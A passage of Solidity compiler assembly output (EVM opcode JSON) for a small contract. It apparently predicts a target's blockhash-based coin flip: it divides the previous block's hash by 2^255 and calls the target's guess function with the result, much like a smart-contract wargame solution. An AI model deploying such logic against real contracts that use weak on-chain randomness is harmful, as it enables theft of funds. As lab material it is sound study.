									"value": "80"
								},
								{
									"begin": 87,
									"end": 846,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 87,
									"end": 846,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 150,
									"end": 227,
									"name": "PUSH",
									"source": 1,
									"value": "8000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 133,
									"end": 227,
									"name": "PUSH",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 133,
									"end": 227,
									"name": "SSTORE",
									"source": 1
								},
								{
									"begin": 254,
									"end": 327,
									"name": "CALLVALUE",
									"source": 1
								},
								{
									"begin": 254,
									"end": 327,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 254,
									"end": 327,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 254,
									"end": 327,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 254,
									"end": 327,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 254,
									"end": 327,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 254,
									"end": 327,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 254,
									"end": 327,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 254,
									"end": 327,
									"name": "tag",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 254,
									"end": 327,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 254,
									"end": 327,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 254,
									"end": 327,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 254,
									"end": 327,
									"name": "MLOAD",
									"source": 1
								},
								{
									"begin": 254,
									"end": 327,
									"name": "PUSHSIZE",
									"source": 1
								},
								{
									"begin": 254,
									"end": 327,
									"name": "CODESIZE",
									"source": 1
								},
								{
									"begin": 254,
									"end": 327,
									"name": "SUB",
									"source": 1
								},
								{
									"begin": 254,
									"end": 327,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 254,
									"end": 327,
									"name": "PUSHSIZE",
									"source": 1
								},
								{
									"begin": 254,
									"end": 327,
									"name": "DUP4",
									"source": 1
								},
								{
									"begin": 254,
									"end": 327,
									"name": "CODECOPY",
									"source": 1
								},
								{
									"begin": 254,
									"end": 327,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 254,
									"end": 327,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 254,
									"end": 327,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 254,
									"end": 327,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 254,
									"end": 327,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 254,
									"end": 327,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 254,
									"end": 327,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 254,
									"end": 327,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 254,
									"end": 327,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "2"
								},
								{
									"begin": 254,
									"end": 327,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 254,
									"end": 327,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 254,
									"end": 327,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "3"
								},
								{
									"begin": 254,
									"end": 327,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 254,
									"end": 327,
									"name": "tag",
									"source": 1,
									"value": "2"
								},
								{
									"begin": 254,
									"end": 327,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 313,
									"end": 319,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 296,
									"end": 301,
									"name": "PUSH",
									"source": 1,
									"value": "2"
								},
								{
									"begin": 296,
									"end": 301,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 296,
									"end": 320,
									"name": "PUSH",
									"source": 1,
									"value": "100"
								},
								{
									"begin": 296,
									"end": 320,
									"name": "EXP",
									"source": 1
								},
								{
									"begin": 296,
									"end": 320,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 296,
									"end": 320,
									"name": "SLOAD",
									"source": 1
								},
								{
									"begin": 296,
									"end": 320,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 296,
									"end": 320,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 296,
									"end": 320,
									"name": "MUL",
									"source": 1
								},
								{
									"begin": 296,
									"end": 320,
									"name": "NOT",
									"source": 1
								},
								{
									"begin": 296,
									"end": 320,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 296,
									"end": 320,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 296,
									"end": 320,
									"name": "DUP4",
									"source": 1
								},
								{
									"begin": 296,
									"end": 320,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 296,
									"end": 320,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 296,
									"end": 320,
									"name": "MUL",
									"source": 1
								},
								{
									"begin": 296,
									"end": 320,
									"name": "OR",
									"source": 1
								},
								{
									"begin": 296,
									"end": 320,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 296,
									"end": 320,
									"name": "SSTORE",
									"source": 1
								},
								{
									"begin": 296,
									"end": 320,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 254,
									"end": 327,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 87,
									"end": 846,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "6"
								},
								{
									"begin": 87,
									"end": 846,
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 88,
									"end": 205,
									"name": "tag",
									"source": 2,
									"value": "8"
								},
								{
									"begin": 88,
									"end": 205,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 197,
									"end": 198,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 194,
									"end": 195,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 187,
									"end": 199,
									"name": "REVERT",
									"source": 2
								},
								{
									"begin": 334,
									"end": 460,
									"name": "tag",
									"source": 2,
									"value": "10"
								},
								{
									"begin": 334,
									"end": 460,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 371,
									"end": 378,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 411,
									"end": 453,
									"name": "PUSH",
									"source": 2,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 404,
									"end": 409,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 400,
									"end": 454,
									"name": "AND",
									"source": 2
								},
								{
									"begin": 389,
									"end": 454,
									"name": "SWAP1",
									"source": 2
								},
								{
									"begin": 389,
									"end": 454,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 334,
									"end": 460,
									"name": "SWAP2",
									"source": 2
								},
								{
									"begin": 334,
									"end": 460,
									"name": "SWAP1",
									"source": 2
								},
								{
									"begin": 334,
									"end": 460,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 334,
									"end": 460,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 2
								},
								{
									"begin": 466,
									"end": 562,
									"name": "tag",
									"source": 2,
									"value": "11"
								},
								{
									"begin": 466,
									"end": 562,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 503,
									"end": 510,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 532,
									"end": 556,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "20"
								},
								{
									"begin": 550,
									"end": 555,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 532,
									"end": 556,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "10"
								},
								{
									"begin": 532,
									"end": 556,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 2
								},
								{
									"begin": 532,
									"end": 556,
									"name": "tag",
									"source": 2,
									"value": "20"
								},
								{
									"begin": 532,
									"end": 556,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 521,
									"end": 556,
									"name": "SWAP1",
									"source": 2
								},
								{
									"begin": 521,
									"end": 556,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 466,
									"end": 562,
									"name": "SWAP2",
									"source": 2
								},
								{
									"begin": 466,
									"end": 562,
									"name": "SWAP1",
									"source": 2
								},
								{
									"begin": 466,
									"end": 562,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 466,
									"end": 562,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 2
								},
								{
									"begin": 568,
									"end": 690,
									"name": "tag",
									"source": 2,
									"value": "12"
								},
								{
									"begin": 568,
									"end": 690,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 641,
									"end": 665,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "22"
								},
								{
									"begin": 659,
									"end": 664,
									"name": "DUP2",
									"source": 2
								},
								{
									"begin": 641,
									"end": 665,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "11"
								},
								{
									"begin": 641,
									"end": 665,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 2
								},
								{
									"begin": 641,
									"end": 665,
									"name": "tag",
									"source": 2,
									"value": "22"
								},
								{
									"begin": 641,
									"end": 665,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 634,
									"end": 639,
									"name": "DUP2",
									"source": 2
								},
								{
									"begin": 631,
									"end": 666,
									"name": "EQ",
									"source": 2
								},
								{
									"begin": 621,
									"end": 684,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "23"
								},
								{
									"begin": 621,
									"end": 684,
									"name": "JUMPI",
									"source": 2
								},
								{
									"begin": 680,
									"end": 681,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 677,
									"end": 678,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 670,
									"end": 682,
									"name": "REVERT",
									"source": 2
								},
								{
									"begin": 621,
									"end": 684,
									"name": "tag",
									"source": 2,
									"value": "23"
								},
								{
									"begin": 621,
									"end": 684,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 568,
									"end": 690,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 568,
									"end": 690,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 2
								},
								{
									"begin": 696,
									"end": 839,
									"name": "tag",
									"source": 2,
									"value": "13"
								},
								{
									"begin": 696,
									"end": 839,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 753,
									"end": 758,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 784,
									"end": 790,
									"name": "DUP2",
									"source": 2
								},
								{
									"begin": 778,
									"end": 791,
									"name": "MLOAD",
									"source": 2
								},
								{
									"begin": 769,
									"end": 791,
									"name": "SWAP1",
									"source": 2
								},
								{
									"begin": 769,
									"end": 791,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 800,
									"end": 833,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "25"
								},
								{
									"begin": 827,
									"end": 832,
									"name": "DUP2",
									"source": 2
								},
								{
									"begin": 800,
									"end": 833,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "12"
								},
								{
									"begin": 800,
									"end": 833,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 2
								},
								{
									"begin": 800,
									"end": 833,
									"name": "tag",
									"source": 2,
									"value": "25"
								},
								{
									"begin": 800,
									"end": 833,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 696,
									"end": 839,
									"name": "SWAP3",
									"source": 2
								},
								{
									"begin": 696,
									"end": 839,
									"name": "SWAP2",
									"source": 2
								},
								{
									"begin": 696,
									"end": 839,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 696,
									"end": 839,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 696,
									"end": 839,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 2
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "tag",
									"source": 2,
									"value": "3"
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 915,
									"end": 921,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 964,
									"end": 966,
									"name": "PUSH",
									"source": 2,
									"value": "20"
								},
								{
									"begin": 952,
									"end": 961,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 943,
									"end": 950,
									"name": "DUP5",
									"source": 2
								},
								{
									"begin": 939,
									"end": 962,
									"name": "SUB",
									"source": 2
								},
								{
									"begin": 935,
									"end": 967,
									"name": "SLT",
									"source": 2
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "ISZERO",
									"source": 2
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "27"
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "JUMPI",
									"source": 2
								},
								{
									"begin": 970,
									"end": 1049,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "28"
								},
								{
									"begin": 970,
									"end": 1049,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "8"
								},
								{
									"begin": 970,
									"end": 1049,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 2
								},
								{
									"begin": 970,
									"end": 1049,
									"name": "tag",
									"source": 2,
									"value": "28"
								},
								{
									"begin": 970,
									"end": 1049,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "tag",
									"source": 2,
									"value": "27"
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 1090,
									"end": 1091,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 1115,
									"end": 1179,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "29"
								},
								{
									"begin": 1171,
									"end": 1178,
									"name": "DUP5",
									"source": 2
								},
								{
									"begin": 1162,
									"end": 1168,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 1151,
									"end": 1160,
									"name": "DUP6",
									"source": 2
								},
								{
									"begin": 1147,
									"end": 1169,
									"name": "ADD",
									"source": 2
								},
								{
									"begin": 1115,
									"end": 1179,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "13"
								},
								{
									"begin": 1115,
									"end": 1179,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 2
								},
								{
									"begin": 1115,
									"end": 1179,
									"name": "tag",
									"source": 2,
									"value": "29"
								},
								{
									"begin": 1115,
									"end": 1179,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 1105,
									"end": 1179,
									"name": "SWAP2",
									"source": 2
								},
								{
									"begin": 1105,
									"end": 1179,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 1061,
									"end": 1189,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "SWAP3",
									"source": 2
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "SWAP2",
									"source": 2
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 845,
									"end": 1196,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 2
								},
								{
									"begin": 87,
									"end": 846,
									"name": "tag",
									"source": 1,
									"value": "6"
								},
								{
									"begin": 87,
									"end": 846,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 87,
									"end": 846,
									"name": "PUSH #[$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 87,
									"end": 846,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 87,
									"end": 846,
									"name": "PUSH [$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 87,
									"end": 846,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 87,
									"end": 846,
									"name": "CODECOPY",
									"source": 1
								},
								{
									"begin": 87,
									"end": 846,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 87,
									"end": 846,
									"name": "RETURN",
									"source": 1
								}
							],
							".data": {
								"0": {
									".auxdata": "a26469706673582212202f488e115fc89ea40ddfe1057ebe35af5d437f9b1e55f2ea48f4f7cc0585fba764736f6c634300081c0033",
									".code": [
										{
											"begin": 87,
											"end": 846,
											"name": "PUSH",
											"source": 1,
											"value": "80"
										},
										{
											"begin": 87,
											"end": 846,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 87,
											"end": 846,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 87,
											"end": 846,
											"name": "CALLVALUE",
											"source": 1
										},
										{
											"begin": 87,
											"end": 846,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 87,
											"end": 846,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 87,
											"end": 846,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 87,
											"end": 846,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 87,
											"end": 846,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 87,
											"end": 846,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 87,
											"end": 846,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 87,
											"end": 846,
											"name": "tag",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 87,
											"end": 846,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 87,
											"end": 846,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 87,
											"end": 846,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 87,
											"end": 846,
											"name": "CALLDATASIZE",
											"source": 1
										},
										{
											"begin": 87,
											"end": 846,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 87,
											"end": 846,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 87,
											"end": 846,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 87,
											"end": 846,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 87,
											"end": 846,
											"name": "CALLDATALOAD",
											"source": 1
										},
										{
											"begin": 87,
											"end": 846,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 87,
											"end": 846,
											"name": "SHR",
											"source": 1
										},
										{
											"begin": 87,
											"end": 846,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 87,
											"end": 846,
											"name": "PUSH",
											"source": 1,
											"value": "63D9B770"
										},
										{
											"begin": 87,
											"end": 846,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 87,
											"end": 846,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "3"
										},
										{
											"begin": 87,
											"end": 846,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 87,
											"end": 846,
											"name": "tag",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 87,
											"end": 846,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 87,
											"end": 846,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 87,
											"end": 846,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 87,
											"end": 846,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 333,
											"end": 841,
											"name": "tag",
											"source": 1,
											"value": "3"
										},
										{
											"begin": 333,
											"end": 841,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 333,
											"end": 841,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 333,
											"end": 841,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "5"
										},
										{
											"begin": 333,
											"end": 841,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 333,
											"end": 841,
											"name": "tag",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 333,
											"end": 841,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 333,
											"end": 841,
											"name": "STOP",
											"source": 1
										},
										{
											"begin": 333,
											"end": 841,
											"name": "tag",
											"source": 1,
											"value": "5"
										},
										{
											"begin": 333,
											"end": 841,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 380,
											"end": 398,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 434,
											"end": 435,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 419,
											"end": 431,
											"name": "NUMBER",
											"source": 1
										},
										{
											"begin": 419,
											"end": 435,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 419,
											"end": 435,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 419,
											"end": 435,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 419,
											"end": 435,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "8"
										},
										{
											"begin": 419,
											"end": 435,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 419,
											"end": 435,
											"name": "tag",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 419,
											"end": 435,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 409,
											"end": 436,
											"name": "BLOCKHASH",
											"source": 1
										},
										{
											"begin": 401,
											"end": 437,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 401,
											"end": 437,
											"name": "SHR",
											"source": 1
										},
										{
											"begin": 380,
											"end": 437,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 380,
											"end": 437,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 467,
											"end": 477,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 455,
											"end": 463,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 455,
											"end": 463,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 455,
											"end": 477,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 451,
											"end": 516,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 451,
											"end": 516,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 493,
											"end": 501,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 493,
											"end": 501,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 493,
											"end": 501,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 451,
											"end": 516,
											"name": "tag",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 451,
											"end": 516,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 541,
											"end": 551,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 530,
											"end": 538,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 530,
											"end": 551,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 530,
											"end": 551,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 530,
											"end": 551,
											"name": "SSTORE",
											"source": 1
										},
										{
											"begin": 530,
											"end": 551,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 565,
											"end": 581,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 597,
											"end": 603,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 597,
											"end": 603,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 584,
											"end": 594,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 584,
											"end": 603,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "10"
										},
										{
											"begin": 584,
											"end": 603,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 584,
											"end": 603,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 584,
											"end": 603,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "11"
										},
										{
											"begin": 584,
											"end": 603,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 584,
											"end": 603,
											"name": "tag",
											"source": 1,
											"value": "10"
										},
										{
											"begin": 584,
											"end": 603,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 565,
											"end": 603,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 565,
											"end": 603,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 617,
											"end": 626,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 641,
											"end": 642,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 629,
											"end": 637,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 629,
											"end": 642,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 629,
											"end": 657,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 629,
											"end": 657,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 652,
											"end": 657,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 629,
											"end": 657,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 629,
											"end": 657,
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 629,
											"end": 657,
											"name": "tag",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 629,
											"end": 657,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 645,
											"end": 649,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 629,
											"end": 657,
											"name": "tag",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 629,
											"end": 657,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 617,
											"end": 657,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 617,
											"end": 657,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 684,
											"end": 688,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 676,
											"end": 688,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 676,
											"end": 688,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 676,
											"end": 680,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 676,
											"end": 688,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 676,
											"end": 688,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 676,
											"end": 688,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 672,
											"end": 831,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 672,
											"end": 831,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 720,
											"end": 725,
											"name": "PUSH",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 720,
											"end": 725,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 720,
											"end": 725,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 720,
											"end": 725,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 720,
											"end": 725,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 720,
											"end": 725,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 720,
											"end": 725,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 720,
											"end": 725,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 720,
											"end": 725,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 720,
											"end": 725,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 720,
											"end": 725,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 720,
											"end": 730,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 720,
											"end": 730,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 720,
											"end": 730,
											"name": "PUSH",
											"source": 1,
											"value": "1D263F67"
										},
										{
											"begin": 731,
											"end": 735,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 720,
											"end": 736,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 720,
											"end": 736,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFF"
										},
										{
											"begin": 720,
											"end": 736,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 720,
											"end": 736,
											"name": "SHL",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 720,
											"end": 736,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "15"
										},
										{
											"begin": 720,
											"end": 736,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 720,
											"end": 736,
											"name": "PUSH [tag]",
